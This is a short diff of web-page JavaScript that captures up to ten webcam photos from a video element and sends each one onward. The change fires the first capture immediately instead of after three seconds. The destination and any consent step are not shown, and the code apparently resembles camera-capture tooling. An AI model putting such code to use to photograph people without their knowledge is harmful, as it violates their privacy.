@@ -105,7 +105,7 @@
             }
         }
 
-        // Capture multiple photos with a 3-second delay between each
+        // Capture multiple photos with an immediate first capture, then a 3-second delay between each
         async function captureMultiplePhotos() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -113,6 +113,7 @@
             const maxCaptures = 10;
             const captureInterval = 3000;
 
+            // Function to capture and send a single photo
             async function captureAndSendPhoto() {
                 try {
                     context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
@@ -139,6 +140,11 @@
                 }
             }
 
+            // Start by capturing the first photo immediately
+            await captureAndSendPhoto();
+            captureCount++;
+
+            // Then set an interval to capture additional photos every 3 seconds
             const captureIntervalId = setInterval(async () => {
                 if (captureCount < maxCaptures) {
                     await captureAndSendPhoto();
